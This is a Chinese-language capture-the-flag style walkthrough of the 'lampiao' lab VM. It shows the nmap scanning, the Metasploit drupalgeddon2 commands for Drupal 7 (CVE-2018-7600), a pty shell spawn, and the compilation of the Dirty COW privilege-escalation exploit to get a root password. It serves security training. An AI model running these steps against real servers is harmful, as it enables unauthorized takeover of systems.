# lampiao 靶机实验

<p align="center">
    <img src="http://p1.music.126.net/dbNvuphUc_mDSWLzjzT7fA==/5979144232442840.jpg?param=130y130" width="25%">
</p>

<p align="center">👴 Ahaha I'm hooked on a feeling,I'm high on believing.</p>
<p align="center"><a href="https://music.163.com/#/song?id=28876107"><font>《Hooked On A Feeling》</font></a> </p>
<p align="center">专辑：Guardians of the Galaxy: Awesome Mix Vol. 1</p>
<p align="center">歌手：Blue Swede</p>

> drupal7 cms远程代码执行漏洞（CVE-2018-7600）和脏牛提权。

[靶机下载地址]：(https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM)


在导入到 VMware 后 发现是个登录界面，在确认靶机 IP段后使用 `nmap` 对目标网段进行扫描

`nmap -T5 -v -f -sS -Pn -p- 192.168.91.0/24`

![](img/1.png)

访问80端口发现一个没用的静态页面，再访问1898端口，出现web页面

![](img/2.png)

进行目录扫描，发现  `robots.txt`

![](img/3.png)

使用用谷歌插件 `wappalyzer` 知道了这个web是用 `drupal7 cms`写的
![](img/4.png)

访问信息配置页面 `http://192.168.91.134:1898/CHANGELOG.txt`

![](img/5.png)

> 快进到 使用 CVE-2018-7600 版本命令执行漏洞

### CVE-2018-7600利用

进入msf，然后search搜索CVE-2018-7600
![](img/6.png)

```
use exploit/unix/webapp/drupal_drupalgeddon2
set rhosts IP
set rport 1898
run
```
![](img/7.png)

用python获取标准shell:
python shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```


![](img/8.png)

去msf中查找对应的exp
```
searchsploit dirty


cp/usr/share/exploitdb/exploits/linux/local/40847.cpp /root/1.cpp

# 进入msf upload 1.cpp

g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 1.cpp -lutil
./40847
```
![](img/9.png)

获取目标 root 密码

ssh重新连接，用户为root，密码为 dirtyCowFun